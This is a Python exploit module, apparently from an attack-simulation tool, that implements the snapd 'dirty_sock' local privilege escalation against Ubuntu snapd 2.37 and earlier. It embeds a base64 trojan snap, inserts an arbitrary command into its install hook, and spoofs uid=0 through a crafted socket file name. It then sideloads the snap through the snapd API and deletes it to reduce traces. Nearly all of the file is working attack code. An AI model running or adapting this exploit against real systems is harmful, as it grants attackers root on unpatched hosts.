"""
    Implementation is based on snapd < 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (2)
    https://github.com/Dhayalanb/Snapd-V2
    Vulnerable snapd versions <=2.37 and If your snapd version has a reference to something like an Ubuntu version number appended to it (example: 2.34.2ubuntu0.1 or 2.35.5+18.10.1) It is patched
"""
import sys
import time
import base64
import string
import socket
import random
import requests
from logging import getLogger
from . import HostPrivExploiter

LOG = getLogger(__name__)

__author__ = "D3fa1t"

APPEND_COMMENT = " #"
SLEEP = 5   # in sec
TROJAN_BASE_SNAP = ('''
aHNxcwcAAACe5/ZcAAACAAEAAAABABEA6wEBAAQAAADYAAAAAAAAAEQHAAAAAAAAPAcAAAAAAAD/
/////////0EFAAAAAAAAOwYAAAAAAADsBgAAAAAAAC4HAAAAAAAAIyEvYmluL2Jhc2gKCnRvdWNo
IC9ldGMvUE9DSEFIQSAjQUF''' + 'BQUF' * 340 + '''BQQpuYW1lOiBkaXJ0eS1zb2NrCnZlcnNpb246ICcwLjEnCnN1bW1hcnk6IEVt
cHR5IHNuYXAsIHVzZWQgZm9yIGV4cGxvaXQKZGVzY3JpcHRpb246ICdTZWUgaHR0cHM6Ly9naXRo
dWIuY29tL2luaXRzdHJpbmcvZGlydHlfc29jawoKICAnCmFyY2hpdGVjdHVyZXM6Ci0gYW1kNjQK
Y29uZmluZW1lbnQ6IGRldm1vZGUKZ3JhZGU6IGRldmVsCviACQD9AQAAAACX5/ZcAwAAAAAAAAAA
AAAAIgQAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAP////8BAP0BAAAAAO3k9lwCAAAAAAAAAAIA
AAAeAAAAAQAAAAIAtAEAAAAA+Ln1XAQAAAAAAAAAAAAAACIEAAC/AAAAAQD9AQAAAAD4ufVcAQAA
AAAAAAADAAAALQAbAAcAAAABAP0BAAAAAPnk9lwGAAAAAAAAAAIAAAAeAEUABQAAAAEA/QEAAAAA
+Ln1XAUAAAAAAAAAAwAAABwAYAAHAAAAAQD9AQAAAAD4ufVcBwAAAAAAAAAEAAAAJwB5AAgAAACd
gAAAAAAAAAAAAwAAAAAAAAACAAYAaW5zdGFsbAEAAAAAAAAAAgAAADgAAAABAAQAaG9va3NYAAIA
AgAIAHNuYXAueWFtbAAAAAAAAAAAAwAAAAAAAAACAAYAaW5zdGFsbAAAAAAAAAAABgAAAJgAAAAB
AAQAaG9va3MBAAAAAAAAAAEAAAB4AAAAAQADAG1ldGG4AAQAAQADAHNuYXAQgGAAAAAAAAAA4QQA
AQAAAADaBgAAAAAAADiAeAAAAAAAAAA4AAAAAAAAAAAAAAAAAAAAWAAAAAAAAAC4AAAAAAAAAJgA
AAAAAAAA2AAAAAAAAAD0BgAAAAAAAASA6AMAADYH'''+'A'*2990 + '==')

def create_sockfile():
    """
    Generates a random socket file name to use
    This is where we slip on the dirty sock. This makes its way into the
    UNIX AF_SOCKET's peer data, which is parsed in an insecure fashion
    by snapd's ucrednet.go file, allowing us to overwrite the UID variable.
    """
    alphabet = string.ascii_lowercase
    random_string = ''.join(random.choice(alphabet) for _ in range(10))
    dirty_sock = ';uid=0;'
    sockfile = '/tmp/' + random_string + dirty_sock
    LOG.info("Slipped dirty sock on random socket file: " + sockfile)
    return sockfile


def bind_sock(sockfile):
    """
    Binds to a local file.
    This exploit only works if we also BIND to the socket after creating
    it, as we need to inject the dirty sock as a remote peer in the
    socket's ancillary data.
    """
    LOG.info("Binding to socket file...")
    client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    client_sock.bind(sockfile)

    # Connect to the snap daemon
    LOG.info("Connecting to snapd API...")
    client_sock.connect('/run/snapd.socket')

    return client_sock


def delete_snap(client_sock):
    """
    Deletes the trojan snap, if installed
    """
    post_payload = ('{"action": "remove",'
                    ' "snaps": ["dirty-sock"]}')
    http_req = ('POST /v2/snaps HTTP/1.1\r\n'
                'Host: localhost\r\n'
                'Content-Type: application/json\r\n'
                'Content-Length: ' + str(len(post_payload)) + '\r\n\r\n'
                + post_payload)

    # Send our payload to the snap API
    print("[+] Deleting trojan snap (and sleeping 5 seconds)...")
    client_sock.sendall(http_req.encode("utf-8"))

    # Receive the data and extract the JSON
    http_reply = client_sock.recv(8192).decode("utf-8")

    # Exit on probably-not-vulnerable
    if '"status":"Unauthorized"' in http_reply:
        print("[!] System may not be vulnerable, here is the API reply:\n\n")
        print(http_reply)
        sys.exit()

    # Exit on failure
    if 'status-code":202' not in http_reply:
        print("[!] Did not work, here is the API reply:\n\n")
        print(http_reply)
        sys.exit()

    # We sleep to allow the API command to complete, otherwise the install
    # may fail.
    time.sleep(SLEEP)


def install_snap(client_sock, TROJAN_SNAP):
    """Sideloads the trojan snap"""

    # Decode the base64 from above back into bytes
    blob = base64.b64decode(TROJAN_SNAP)

    # Configure the multi-part form upload boundary here:
    boundary = '------------------------f8c156143a1caf97'

    # Construct the POST payload for the /v2/snap API, per the instructions
    # here: https://github.com/snapcore/snapd/wiki/REST-API
    # This follows the 'sideloading' process.
    post_payload = '''
--------------------------f8c156143a1caf97
Content-Disposition: form-data; name="devmode"

true
--------------------------f8c156143a1caf97
Content-Disposition: form-data; name="snap"; filename="snap.snap"
Content-Type: application/octet-stream

''' + blob.decode('latin-1') + '''
--------------------------f8c156143a1caf97--'''

    # Multi-part forum uploads are weird. First, we post the headers
    # and wait for an HTTP 100 reply. THEN we can send the payload.
    http_req1 = ('POST /v2/snaps HTTP/1.1\r\n'
                 'Host: localhost\r\n'
                 'Content-Type: multipart/form-data; boundary='
                 + boundary + '\r\n'
                 'Expect: 100-continue\r\n'
                 'Content-Length: ' + str(len(post_payload)) + '\r\n\r\n')

    # Send the headers to the snap API
    print("[+] Installing the trojan snap (and sleeping 8 seconds)...")
    client_sock.sendall(http_req1.encode("utf-8"))

    # Receive the initial HTTP/1.1 100 Continue reply
    http_reply = client_sock.recv(8192).decode("utf-8")

    if 'HTTP/1.1 100 Continue' not in http_reply:
        print("[!] Error starting POST conversation, here is the reply:\n\n")
        print(http_reply)
        sys.exit()

    # Now we can send the payload
    http_req2 = post_payload
    client_sock.sendall(http_req2.encode("latin-1"))

    # Receive the data and extract the JSON
    http_reply = client_sock.recv(8192).decode("utf-8")

    # Exit on failure
    if 'status-code":202' not in http_reply:
        print("[!] Did not work, here is the API reply:\n\n")
        print(http_reply)
        sys.exit()

    # Sleep to allow time for the snap to install correctly. Otherwise,
    # The uninstall that follows will fail, leaving unnecessary traces
    # on the machine.
    time.sleep(8)


class snapdExploiter(HostPrivExploiter):
    def try_priv_esc(self,command):
        '''
        This function tries pe and if succeeds then we run the command 
        '''
        global TROJAN_BASE_SNAP
        command = command + APPEND_COMMENT
        index = 108 + len(command)
        TROJAN_BASE_SNAP_DECODE = TROJAN_BASE_SNAP.decode('base64')
        TROJAN_SNAP = base64.b64encode("".join(
            (TROJAN_BASE_SNAP_DECODE[:108], command, TROJAN_BASE_SNAP_DECODE[index:])))

        # Create a random name for the dirty socket file
        sockfile = create_sockfile()

        # Bind the dirty socket to the snapdapi
        client_sock = bind_sock(sockfile)

        # Delete trojan snap, in case there was a previous install attempt
        delete_snap(client_sock)

        # Install the trojan snap, which has an install hook that creates a user
        install_snap(client_sock, TROJAN_SNAP)

        # Delete the trojan snap
        delete_snap(client_sock)

        LOG.info("Command Executed Successfully \n")